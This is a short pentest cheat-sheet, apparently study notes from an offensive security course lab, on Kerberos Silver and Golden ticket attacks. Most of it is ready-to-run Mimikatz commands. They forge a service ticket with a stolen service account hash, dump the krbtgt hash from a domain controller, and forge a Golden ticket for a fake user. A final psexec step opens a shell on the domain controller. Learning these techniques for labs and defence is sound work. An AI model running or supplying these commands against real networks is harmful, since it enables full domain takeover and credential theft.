# Silver / Golden

### Silver TGS with service acct pwd / ntlm hash to access resrc

access service as SID user with fake group membership from app perspective

{% code overflow="wrap" %}
```
kerberos::purge
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
(/user username; /domain domain name; /sid domain sid from whoami /user; /target full serivce host name;  /service:HTTP service type eg:MSSQLSvc; /rc4 pwd hash of service acct; /ptt mem inject)
#need hash the cleartxt if only get cleartxt pwd
```
{% endcode %}

### Golden TGT with krbtgt hash to access DC with fake priv

need have access to domain admin / dc ser admin ; run mimi as dc admin

{% code overflow="wrap" %}
```
privilege::debug
lsadump::lsa /patch
#to dump krbtgt NTML hash

#to create golden tix: (no need admin, can do on non-domain computer)
kerberos::purge
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
(username as fakeuser would be allowed as DC trusts anything correctly encryted with krbtgt pwd hash)

misc::cmd 
psexec.exe \\dc01 cmd.exe (or use C:\Users\Public\shell.exe if placed on dc01)
```
{% endcode %}

